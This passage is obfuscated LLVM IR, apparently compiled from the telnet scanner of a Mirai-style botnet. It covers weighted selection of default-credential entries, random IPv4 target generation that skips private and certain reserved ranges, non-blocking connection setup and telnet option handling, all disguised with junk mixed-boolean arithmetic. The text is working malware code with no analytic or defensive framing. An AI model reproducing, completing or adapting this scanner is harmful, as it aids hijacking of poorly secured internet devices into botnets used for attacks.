  %47 = load i16, i16* @auth_table_max_weight, align 2
  %48 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %49 = load i32, i32* @auth_table_len, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %48, i64 %50
  %52 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %51, i32 0, i32 2
  store i16 %47, i16* %52, align 8
  %53 = load i16, i16* @auth_table_max_weight, align 2
  %54 = zext i16 %53 to i32
  %55 = load i16, i16* %6, align 2
  %56 = zext i16 %55 to i32
  %57 = sub i32 0, %56
  %58 = sub i32 %54, %57
  %59 = add nsw i32 %54, %56
  %60 = trunc i32 %58 to i16
  %61 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %62 = load i32, i32* @auth_table_len, align 4
  %63 = sub i32 %62, 1258701385
  %64 = add i32 %63, 1
  %65 = add i32 %64, 1258701385
  %66 = add nsw i32 %62, 1
  store i32 %65, i32* @auth_table_len, align 4
  %67 = sext i32 %62 to i64
  %68 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %61, i64 %67
  %69 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %68, i32 0, i32 3
  store i16 %60, i16* %69, align 2
  %70 = load i16, i16* %6, align 2
  %71 = zext i16 %70 to i32
  %72 = load i16, i16* @auth_table_max_weight, align 2
  %73 = zext i16 %72 to i32
  %74 = sub i32 0, %71
  %75 = sub i32 %73, %74
  %76 = add nsw i32 %73, %71
  %77 = trunc i32 %75 to i16
  store i16 %77, i16* @auth_table_max_weight, align 2
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @get_random_ip() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i8, align 1
  %3 = alloca i8, align 1
  %4 = alloca i8, align 1
  %5 = alloca i8, align 1
  br label %6

; <label>:6:                                      ; preds = %249, %0
  %7 = call i32 @rand_next()
  store i32 %7, i32* %1, align 4
  %8 = load i32, i32* %1, align 4
  %9 = xor i32 %8, -1
  %10 = xor i32 255, -1
  %11 = xor i32 -569195412, -1
  %12 = or i32 %9, %10
  %13 = or i32 -569195412, %11
  %14 = xor i32 %12, -1
  %15 = and i32 %14, %13
  %16 = and i32 %8, 255
  %17 = trunc i32 %15 to i8
  store i8 %17, i8* %2, align 1
  %18 = load i32, i32* %1, align 4
  %19 = lshr i32 %18, 8
  %20 = xor i32 %19, -1
  %21 = xor i32 255, -1
  %22 = xor i32 1709247899, -1
  %23 = or i32 %20, %21
  %24 = or i32 1709247899, %22
  %25 = xor i32 %23, -1
  %26 = and i32 %25, %24
  %27 = and i32 %19, 255
  %28 = trunc i32 %26 to i8
  store i8 %28, i8* %3, align 1
  %29 = load i32, i32* %1, align 4
  %30 = lshr i32 %29, 16
  %31 = xor i32 255, -1
  %32 = xor i32 %30, %31
  %33 = and i32 %32, %30
  %34 = and i32 %30, 255
  %35 = trunc i32 %33 to i8
  store i8 %35, i8* %4, align 1
  %36 = load i32, i32* %1, align 4
  %37 = lshr i32 %36, 24
  %38 = xor i32 %37, -1
  %39 = xor i32 255, -1
  %40 = xor i32 -1891427658, -1
  %41 = or i32 %38, %39
  %42 = or i32 -1891427658, %40
  %43 = xor i32 %41, -1
  %44 = and i32 %43, %42
  %45 = and i32 %37, 255
  %46 = trunc i32 %44 to i8
  store i8 %46, i8* %5, align 1
  br label %47

; <label>:47:                                     ; preds = %6
  %48 = load i8, i8* %2, align 1
  %49 = zext i8 %48 to i32
  %50 = icmp eq i32 %49, 127
  br i1 %50, label %249, label %51

; <label>:51:                                     ; preds = %47
  %52 = load i8, i8* %2, align 1
  %53 = zext i8 %52 to i32
  %54 = icmp eq i32 %53, 0
  br i1 %54, label %249, label %55

; <label>:55:                                     ; preds = %51
  %56 = load i8, i8* %2, align 1
  %57 = zext i8 %56 to i32
  %58 = icmp eq i32 %57, 3
  br i1 %58, label %249, label %59

; <label>:59:                                     ; preds = %55
  %60 = load i8, i8* %2, align 1
  %61 = zext i8 %60 to i32
  %62 = icmp eq i32 %61, 15
  br i1 %62, label %249, label %63

; <label>:63:                                     ; preds = %59
  %64 = load i8, i8* %2, align 1
  %65 = zext i8 %64 to i32
  %66 = icmp eq i32 %65, 16
  br i1 %66, label %249, label %67

; <label>:67:                                     ; preds = %63
  %68 = load i8, i8* %2, align 1
  %69 = zext i8 %68 to i32
  %70 = icmp eq i32 %69, 56
  br i1 %70, label %249, label %71

; <label>:71:                                     ; preds = %67
  %72 = load i8, i8* %2, align 1
  %73 = zext i8 %72 to i32
  %74 = icmp eq i32 %73, 10
  br i1 %74, label %249, label %75

; <label>:75:                                     ; preds = %71
  %76 = load i8, i8* %2, align 1
  %77 = zext i8 %76 to i32
  %78 = icmp eq i32 %77, 192
  br i1 %78, label %79, label %83

; <label>:79:                                     ; preds = %75
  %80 = load i8, i8* %3, align 1
  %81 = zext i8 %80 to i32
  %82 = icmp eq i32 %81, 168
  br i1 %82, label %249, label %83

; <label>:83:                                     ; preds = %79, %75
  %84 = load i8, i8* %2, align 1
  %85 = zext i8 %84 to i32
  %86 = icmp eq i32 %85, 172
  br i1 %86, label %87, label %95

; <label>:87:                                     ; preds = %83
  %88 = load i8, i8* %3, align 1
  %89 = zext i8 %88 to i32
  %90 = icmp sge i32 %89, 16
  br i1 %90, label %91, label %95

; <label>:91:                                     ; preds = %87
  %92 = load i8, i8* %3, align 1
  %93 = zext i8 %92 to i32
  %94 = icmp slt i32 %93, 32
  br i1 %94, label %249, label %95

; <label>:95:                                     ; preds = %91, %87, %83
  %96 = load i8, i8* %2, align 1
  %97 = zext i8 %96 to i32
  %98 = icmp eq i32 %97, 100
  br i1 %98, label %99, label %107

; <label>:99:                                     ; preds = %95
  %100 = load i8, i8* %3, align 1
  %101 = zext i8 %100 to i32
  %102 = icmp sge i32 %101, 64
  br i1 %102, label %103, label %107

; <label>:103:                                    ; preds = %99
  %104 = load i8, i8* %3, align 1
  %105 = zext i8 %104 to i32
  %106 = icmp slt i32 %105, 127
  br i1 %106, label %249, label %107

; <label>:107:                                    ; preds = %103, %99, %95
  %108 = load i8, i8* %2, align 1
  %109 = zext i8 %108 to i32
  %110 = icmp eq i32 %109, 169
  br i1 %110, label %111, label %115

; <label>:111:                                    ; preds = %107
  %112 = load i8, i8* %3, align 1
  %113 = zext i8 %112 to i32
  %114 = icmp sgt i32 %113, 254
  br i1 %114, label %249, label %115

; <label>:115:                                    ; preds = %111, %107
  %116 = load i8, i8* %2, align 1
  %117 = zext i8 %116 to i32
  %118 = icmp eq i32 %117, 198
  br i1 %118, label %119, label %127

; <label>:119:                                    ; preds = %115
  %120 = load i8, i8* %3, align 1
  %121 = zext i8 %120 to i32
  %122 = icmp sge i32 %121, 18
  br i1 %122, label %123, label %127

; <label>:123:                                    ; preds = %119
  %124 = load i8, i8* %3, align 1
  %125 = zext i8 %124 to i32
  %126 = icmp slt i32 %125, 20
  br i1 %126, label %249, label %127

; <label>:127:                                    ; preds = %123, %119, %115
  %128 = load i8, i8* %2, align 1
  %129 = zext i8 %128 to i32
  %130 = icmp sge i32 %129, 224
  br i1 %130, label %249, label %131

; <label>:131:                                    ; preds = %127
  %132 = load i8, i8* %2, align 1
  %133 = zext i8 %132 to i32
  %134 = icmp eq i32 %133, 106
  br i1 %134, label %135, label %139

; <label>:135:                                    ; preds = %131
  %136 = load i8, i8* %3, align 1
  %137 = zext i8 %136 to i32
  %138 = icmp eq i32 %137, 186
  br i1 %138, label %249, label %139

; <label>:139:                                    ; preds = %135, %131
  %140 = load i8, i8* %2, align 1
  %141 = zext i8 %140 to i32
  %142 = icmp eq i32 %141, 106
  br i1 %142, label %143, label %147

; <label>:143:                                    ; preds = %139
  %144 = load i8, i8* %3, align 1
  %145 = zext i8 %144 to i32
  %146 = icmp eq i32 %145, 187
  br i1 %146, label %249, label %147

; <label>:147:                                    ; preds = %143, %139
  %148 = load i8, i8* %2, align 1
  %149 = zext i8 %148 to i32
  %150 = icmp eq i32 %149, 106
  br i1 %150, label %151, label %155

; <label>:151:                                    ; preds = %147
  %152 = load i8, i8* %3, align 1
  %153 = zext i8 %152 to i32
  %154 = icmp eq i32 %153, 185
  br i1 %154, label %249, label %155

; <label>:155:                                    ; preds = %151, %147
  %156 = load i8, i8* %2, align 1
  %157 = zext i8 %156 to i32
  %158 = icmp eq i32 %157, 106
  br i1 %158, label %159, label %163

; <label>:159:                                    ; preds = %155
  %160 = load i8, i8* %3, align 1
  %161 = zext i8 %160 to i32
  %162 = icmp eq i32 %161, 184
  br i1 %162, label %249, label %163

; <label>:163:                                    ; preds = %159, %155
  %164 = load i8, i8* %2, align 1
  %165 = zext i8 %164 to i32
  %166 = icmp eq i32 %165, 150
  br i1 %166, label %167, label %171

; <label>:167:                                    ; preds = %163
  %168 = load i8, i8* %3, align 1
  %169 = zext i8 %168 to i32
  %170 = icmp eq i32 %169, 31
  br i1 %170, label %249, label %171

; <label>:171:                                    ; preds = %167, %163
  %172 = load i8, i8* %2, align 1
  %173 = zext i8 %172 to i32
  %174 = icmp eq i32 %173, 49
  br i1 %174, label %175, label %179

; <label>:175:                                    ; preds = %171
  %176 = load i8, i8* %3, align 1
  %177 = zext i8 %176 to i32
  %178 = icmp eq i32 %177, 51
  br i1 %178, label %249, label %179

; <label>:179:                                    ; preds = %175, %171
  %180 = load i8, i8* %2, align 1
  %181 = zext i8 %180 to i32
  %182 = icmp eq i32 %181, 178
  br i1 %182, label %183, label %187

; <label>:183:                                    ; preds = %179
  %184 = load i8, i8* %3, align 1
  %185 = zext i8 %184 to i32
  %186 = icmp eq i32 %185, 62
  br i1 %186, label %249, label %187

; <label>:187:                                    ; preds = %183, %179
  %188 = load i8, i8* %2, align 1
  %189 = zext i8 %188 to i32
  %190 = icmp eq i32 %189, 160
  br i1 %190, label %191, label %195

; <label>:191:                                    ; preds = %187
  %192 = load i8, i8* %3, align 1
  %193 = zext i8 %192 to i32
  %194 = icmp eq i32 %193, 13
  br i1 %194, label %249, label %195

; <label>:195:                                    ; preds = %191, %187
  %196 = load i8, i8* %2, align 1
  %197 = zext i8 %196 to i32
  %198 = icmp eq i32 %197, 6
  br i1 %198, label %247, label %199

; <label>:199:                                    ; preds = %195
  %200 = load i8, i8* %2, align 1
  %201 = zext i8 %200 to i32
  %202 = icmp eq i32 %201, 7
  br i1 %202, label %247, label %203

; <label>:203:                                    ; preds = %199
  %204 = load i8, i8* %2, align 1
  %205 = zext i8 %204 to i32
  %206 = icmp eq i32 %205, 11
  br i1 %206, label %247, label %207

; <label>:207:                                    ; preds = %203
  %208 = load i8, i8* %2, align 1
  %209 = zext i8 %208 to i32
  %210 = icmp eq i32 %209, 21
  br i1 %210, label %247, label %211

; <label>:211:                                    ; preds = %207
  %212 = load i8, i8* %2, align 1
  %213 = zext i8 %212 to i32
  %214 = icmp eq i32 %213, 22
  br i1 %214, label %247, label %215

; <label>:215:                                    ; preds = %211
  %216 = load i8, i8* %2, align 1
  %217 = zext i8 %216 to i32
  %218 = icmp eq i32 %217, 26
  br i1 %218, label %247, label %219

; <label>:219:                                    ; preds = %215
  %220 = load i8, i8* %2, align 1
  %221 = zext i8 %220 to i32
  %222 = icmp eq i32 %221, 28
  br i1 %222, label %247, label %223

; <label>:223:                                    ; preds = %219
  %224 = load i8, i8* %2, align 1
  %225 = zext i8 %224 to i32
  %226 = icmp eq i32 %225, 29
  br i1 %226, label %247, label %227

; <label>:227:                                    ; preds = %223
  %228 = load i8, i8* %2, align 1
  %229 = zext i8 %228 to i32
  %230 = icmp eq i32 %229, 30
  br i1 %230, label %247, label %231

; <label>:231:                                    ; preds = %227
  %232 = load i8, i8* %2, align 1
  %233 = zext i8 %232 to i32
  %234 = icmp eq i32 %233, 33
  br i1 %234, label %247, label %235

; <label>:235:                                    ; preds = %231
  %236 = load i8, i8* %2, align 1
  %237 = zext i8 %236 to i32
  %238 = icmp eq i32 %237, 55
  br i1 %238, label %247, label %239

; <label>:239:                                    ; preds = %235
  %240 = load i8, i8* %2, align 1
  %241 = zext i8 %240 to i32
  %242 = icmp eq i32 %241, 214
  br i1 %242, label %247, label %243

; <label>:243:                                    ; preds = %239
  %244 = load i8, i8* %2, align 1
  %245 = zext i8 %244 to i32
  %246 = icmp eq i32 %245, 215
  br label %247

; <label>:247:                                    ; preds = %243, %239, %235, %231, %227, %223, %219, %215, %211, %207, %203, %199, %195
  %248 = phi i1 [ true, %239 ], [ true, %235 ], [ true, %231 ], [ true, %227 ], [ true, %223 ], [ true, %219 ], [ true, %215 ], [ true, %211 ], [ true, %207 ], [ true, %203 ], [ true, %199 ], [ true, %195 ], [ %246, %243 ]
  br label %249

; <label>:249:                                    ; preds = %247, %191, %183, %175, %167, %159, %151, %143, %135, %127, %123, %111, %103, %91, %79, %71, %67, %63, %59, %55, %51, %47
  %250 = phi i1 [ true, %191 ], [ true, %183 ], [ true, %175 ], [ true, %167 ], [ true, %159 ], [ true, %151 ], [ true, %143 ], [ true, %135 ], [ true, %127 ], [ true, %123 ], [ true, %111 ], [ true, %103 ], [ true, %91 ], [ true, %79 ], [ true, %71 ], [ true, %67 ], [ true, %63 ], [ true, %59 ], [ true, %55 ], [ true, %51 ], [ true, %47 ], [ %248, %247 ]
  br i1 %250, label %6, label %251

; <label>:251:                                    ; preds = %249
  %252 = load i8, i8* %2, align 1
  %253 = zext i8 %252 to i32
  %254 = shl i32 %253, 24
  %255 = load i8, i8* %3, align 1
  %256 = zext i8 %255 to i32
  %257 = shl i32 %256, 16
  %258 = and i32 %254, %257
  %259 = xor i32 %254, %257
  %260 = or i32 %258, %259
  %261 = or i32 %254, %257
  %262 = load i8, i8* %4, align 1
  %263 = zext i8 %262 to i32
  %264 = shl i32 %263, 8
  %265 = xor i32 %260, -1
  %266 = xor i32 %264, -1
  %267 = xor i32 1677696238, -1
  %268 = and i32 %265, 1677696238
  %269 = and i32 %260, %267
  %270 = and i32 %266, 1677696238
  %271 = and i32 %264, %267
  %272 = or i32 %268, %269
  %273 = or i32 %270, %271
  %274 = xor i32 %272, %273
  %275 = or i32 %265, %266
  %276 = xor i32 %275, -1
  %277 = or i32 1677696238, %267
  %278 = and i32 %276, %277
  %279 = or i32 %274, %278
  %280 = or i32 %260, %264
  %281 = load i8, i8* %5, align 1
  %282 = zext i8 %281 to i32
  %283 = shl i32 %282, 0
  %284 = xor i32 %279, -1
  %285 = xor i32 %283, -1
  %286 = xor i32 1363316833, -1
  %287 = and i32 %284, 1363316833
  %288 = and i32 %279, %286
  %289 = and i32 %285, 1363316833
  %290 = and i32 %283, %286
  %291 = or i32 %287, %288
  %292 = or i32 %289, %290
  %293 = xor i32 %291, %292
  %294 = or i32 %284, %285
  %295 = xor i32 %294, -1
  %296 = or i32 1363316833, %286
  %297 = and i32 %295, %296
  %298 = or i32 %293, %297
  %299 = or i32 %279, %283
  %300 = call i32 @htonl(i32 %298) #7
  ret i32 %300
}

; Function Attrs: noinline nounwind uwtable
define internal void @setup_connection(%struct.scanner_connection*) #0 {
  %2 = alloca %struct.scanner_connection*, align 8
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %2, align 8
  %5 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %5, i8 0, i64 16, i32 4, i1 false)
  %6 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %7 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %6, i32 0, i32 1
  %8 = load i32, i32* %7, align 8
  %9 = icmp ne i32 %8, -1
  br i1 %9, label %10, label %15

; <label>:10:                                     ; preds = %1
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 1
  %13 = load i32, i32* %12, align 8
  %14 = call i32 @close(i32 %13)
  br label %15

; <label>:15:                                     ; preds = %10, %1
  %16 = call i32 @socket(i32 2, i32 1, i32 0) #6
  %17 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %18 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %17, i32 0, i32 1
  store i32 %16, i32* %18, align 8
  %19 = icmp eq i32 %16, -1
  br i1 %19, label %20, label %21

; <label>:20:                                     ; preds = %15
  br label %74

; <label>:21:                                     ; preds = %15
  %22 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %23 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %22, i32 0, i32 6
  store i32 0, i32* %23, align 4
  %24 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %25 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %24, i32 0, i32 7
  %26 = getelementptr inbounds [256 x i8], [256 x i8]* %25, i32 0, i32 0
  call void @util_zero(i8* %26, i32 256)
  %27 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %28 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %27, i32 0, i32 1
  %29 = load i32, i32* %28, align 8
  %30 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %31 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %30, i32 0, i32 1
  %32 = load i32, i32* %31, align 8
  %33 = call i32 (i32, i32, ...) @fcntl(i32 %32, i32 3, i32 0)
  %34 = xor i32 2048, -1
  %35 = xor i32 %33, -1
  %36 = xor i32 1945104129, -1
  %37 = and i32 %34, 1945104129
  %38 = and i32 2048, %36
  %39 = and i32 %35, 1945104129
  %40 = and i32 %33, %36
  %41 = or i32 %37, %38
  %42 = or i32 %39, %40
  %43 = xor i32 %41, %42
  %44 = or i32 %34, %35
  %45 = xor i32 %44, -1
  %46 = or i32 1945104129, %36
  %47 = and i32 %45, %46
  %48 = or i32 %43, %47
  %49 = or i32 2048, %33
  %50 = call i32 (i32, i32, ...) @fcntl(i32 %29, i32 4, i32 %48)
  %51 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %51, align 4
  %52 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %53 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %52, i32 0, i32 4
  %54 = load i32, i32* %53, align 4
  %55 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %56 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %55, i32 0, i32 0
  store i32 %54, i32* %56, align 4
  %57 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %58 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %57, i32 0, i32 5
  %59 = load i16, i16* %58, align 8
  %60 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %59, i16* %60, align 2
  %61 = load i32, i32* @fake_time, align 4
  %62 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %63 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %62, i32 0, i32 2
  store i32 %61, i32* %63, align 4
  %64 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %65 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %64, i32 0, i32 3
  store i32 1, i32* %65, align 8
  %66 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %67 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %66, i32 0, i32 1
  %68 = load i32, i32* %67, align 8
  %69 = bitcast %union.__CONST_SOCKADDR_ARG* %4 to %struct.sockaddr**
  %70 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  store %struct.sockaddr* %70, %struct.sockaddr** %69, align 8
  %71 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %4, i32 0, i32 0
  %72 = load %struct.sockaddr*, %struct.sockaddr** %71, align 8
  %73 = call i32 @connect(i32 %68, %struct.sockaddr* %72, i32 16)
  br label %74

; <label>:74:                                     ; preds = %21, %20
  ret void
}

declare i32 @select(i32, %struct.fd_set.30*, %struct.fd_set.30*, %struct.fd_set.30*, %struct.timeval.31*) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #1

; Function Attrs: noinline nounwind uwtable
define internal %struct.scanner_auth* @random_auth_entry() #0 {
  %1 = alloca %struct.scanner_auth*, align 8
  %2 = alloca i32, align 4
  %3 = alloca i16, align 2
  %4 = call i32 @rand_next()
  %5 = load i16, i16* @auth_table_max_weight, align 2
  %6 = zext i16 %5 to i32
  %7 = urem i32 %4, %6
  %8 = trunc i32 %7 to i16
  store i16 %8, i16* %3, align 2
  store i32 0, i32* %2, align 4
  br label %9

; <label>:9:                                      ; preds = %43, %0
  %10 = load i32, i32* %2, align 4
  %11 = load i32, i32* @auth_table_len, align 4
  %12 = icmp slt i32 %10, %11
  br i1 %12, label %13, label %48

; <label>:13:                                     ; preds = %9
  %14 = load i16, i16* %3, align 2
  %15 = zext i16 %14 to i32
  %16 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %17 = load i32, i32* %2, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %16, i64 %18
  %20 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %19, i32 0, i32 2
  %21 = load i16, i16* %20, align 8
  %22 = zext i16 %21 to i32
  %23 = icmp slt i32 %15, %22
  br i1 %23, label %24, label %25

; <label>:24:                                     ; preds = %13
  br label %43

; <label>:25:                                     ; preds = %13
  %26 = load i16, i16* %3, align 2
  %27 = zext i16 %26 to i32
  %28 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %29 = load i32, i32* %2, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %28, i64 %30
  %32 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %31, i32 0, i32 3
  %33 = load i16, i16* %32, align 2
  %34 = zext i16 %33 to i32
  %35 = icmp slt i32 %27, %34
  br i1 %35, label %36, label %41

; <label>:36:                                     ; preds = %25
  %37 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %38 = load i32, i32* %2, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %37, i64 %39
  store %struct.scanner_auth* %40, %struct.scanner_auth** %1, align 8
  br label %49

; <label>:41:                                     ; preds = %25
  br label %42

; <label>:42:                                     ; preds = %41
  br label %43

; <label>:43:                                     ; preds = %42, %24
  %44 = load i32, i32* %2, align 4
  %45 = sub i32 0, 1
  %46 = sub i32 %44, %45
  %47 = add nsw i32 %44, 1
  store i32 %46, i32* %2, align 4
  br label %9

; <label>:48:                                     ; preds = %9
  store %struct.scanner_auth* null, %struct.scanner_auth** %1, align 8
  br label %49

; <label>:49:                                     ; preds = %48, %36
  %50 = load %struct.scanner_auth*, %struct.scanner_auth** %1, align 8
  ret %struct.scanner_auth* %50
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: noinline nounwind uwtable
define i32 @recv_strip_null(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  %11 = load i32, i32* %5, align 4
  %12 = load i8*, i8** %6, align 8
  %13 = load i32, i32* %7, align 4
  %14 = sext i32 %13 to i64
  %15 = load i32, i32* %8, align 4
  %16 = call i64 @recv(i32 %11, i8* %12, i64 %14, i32 %15)
  %17 = trunc i64 %16 to i32
  store i32 %17, i32* %9, align 4
  %18 = load i32, i32* %9, align 4
  %19 = icmp sgt i32 %18, 0
  br i1 %19, label %20, label %46

; <label>:20:                                     ; preds = %4
  store i32 0, i32* %10, align 4
  store i32 0, i32* %10, align 4
  br label %21

; <label>:21:                                     ; preds = %39, %20
  %22 = load i32, i32* %10, align 4
  %23 = load i32, i32* %9, align 4
  %24 = icmp slt i32 %22, %23
  br i1 %24, label %25, label %45

; <label>:25:                                     ; preds = %21
  %26 = load i8*, i8** %6, align 8
  %27 = load i32, i32* %10, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds i8, i8* %26, i64 %28
  %30 = load i8, i8* %29, align 1
  %31 = sext i8 %30 to i32
  %32 = icmp eq i32 %31, 0
  br i1 %32, label %33, label %38

; <label>:33:                                     ; preds = %25
  %34 = load i8*, i8** %6, align 8
  %35 = load i32, i32* %10, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds i8, i8* %34, i64 %36
  store i8 65, i8* %37, align 1
  br label %38

; <label>:38:                                     ; preds = %33, %25
  br label %39

; <label>:39:                                     ; preds = %38
  %40 = load i32, i32* %10, align 4
  %41 = add i32 %40, 382918018
  %42 = add i32 %41, 1
  %43 = sub i32 %42, 382918018
  %44 = add nsw i32 %40, 1
  store i32 %43, i32* %10, align 4
  br label %21

; <label>:45:                                     ; preds = %21
  br label %46

; <label>:46:                                     ; preds = %45, %4
  %47 = load i32, i32* %9, align 4
  ret i32 %47
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_iacs(%struct.scanner_connection*) #0 {
  %2 = alloca %struct.scanner_connection*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca [3 x i8], align 1
  %7 = alloca [9 x i8], align 1
  store %struct.scanner_connection* %0, %struct.scanner_connection** %2, align 8
  store i32 0, i32* %3, align 4
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i32 0, i32 0
  store i8* %10, i8** %4, align 8
  br label %11

; <label>:11:                                     ; preds = %147, %40, %1
  %12 = load i32, i32* %3, align 4
  %13 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %14 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %13, i32 0, i32 6
  %15 = load i32, i32* %14, align 4
  %16 = icmp slt i32 %12, %15
  br i1 %16, label %17, label %148

; <label>:17:                                     ; preds = %11
  %18 = load i8*, i8** %4, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp ne i32 %20, 255
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %17
  br label %148

; <label>:23:                                     ; preds = %17
  %24 = load i8*, i8** %4, align 8
  %25 = load i8, i8* %24, align 1
  %26 = zext i8 %25 to i32
  %27 = icmp eq i32 %26, 255
  br i1 %27, label %28, label %146

; <label>:28:                                     ; preds = %23
  %29 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %30 = load i8*, i8** %4, align 8
  %31 = call signext i8 @can_consume(%struct.scanner_connection* %29, i8* %30, i32 1)
  %32 = icmp ne i8 %31, 0
  br i1 %32, label %34, label %33

; <label>:33:                                     ; preds = %28
  br label %148

; <label>:34:                                     ; preds = %28
  %35 = load i8*, i8** %4, align 8
  %36 = getelementptr inbounds i8, i8* %35, i64 1
  %37 = load i8, i8* %36, align 1
  %38 = zext i8 %37 to i32
  %39 = icmp eq i32 %38, 255
  br i1 %39, label %40, label %47

; <label>:40:                                     ; preds = %34
  %41 = load i8*, i8** %4, align 8
  %42 = getelementptr inbounds i8, i8* %41, i64 2
  store i8* %42, i8** %4, align 8
  %43 = load i32, i32* %3, align 4
  %44 = sub i32 0, 2
  %45 = sub i32 %43, %44
  %46 = add nsw i32 %43, 2
  store i32 %45, i32* %3, align 4
  br label %11

; <label>:47:                                     ; preds = %34
  %48 = load i8*, i8** %4, align 8
  %49 = getelementptr inbounds i8, i8* %48, i64 1
  %50 = load i8, i8* %49, align 1
  %51 = zext i8 %50 to i32
  %52 = icmp eq i32 %51, 253
  br i1 %52, label %53, label %87

; <label>:53:                                     ; preds = %47
  %54 = bitcast [3 x i8]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %54, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @consume_iacs.tmp1, i32 0, i32 0), i64 3, i32 1, i1 false)
  %55 = bitcast [9 x i8]* %7 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %55, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @consume_iacs.tmp2, i32 0, i32 0), i64 9, i32 1, i1 false)
  %56 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %57 = load i8*, i8** %4, align 8
  %58 = call signext i8 @can_consume(%struct.scanner_connection* %56, i8* %57, i32 2)
  %59 = icmp ne i8 %58, 0
  br i1 %59, label %61, label %60

; <label>:60:                                     ; preds = %53
  br label %148

; <label>:61:                                     ; preds = %53
  %62 = load i8*, i8** %4, align 8
  %63 = getelementptr inbounds i8, i8* %62, i64 2
  %64 = load i8, i8* %63, align 1
  %65 = zext i8 %64 to i32
  %66 = icmp ne i32 %65, 31
  br i1 %66, label %67, label %68

; <label>:67:                                     ; preds = %61
  br label %88

; <label>:68:                                     ; preds = %61
  %69 = load i8*, i8** %4, align 8
  %70 = getelementptr inbounds i8, i8* %69, i64 3
  store i8* %70, i8** %4, align 8
  %71 = load i32, i32* %3, align 4
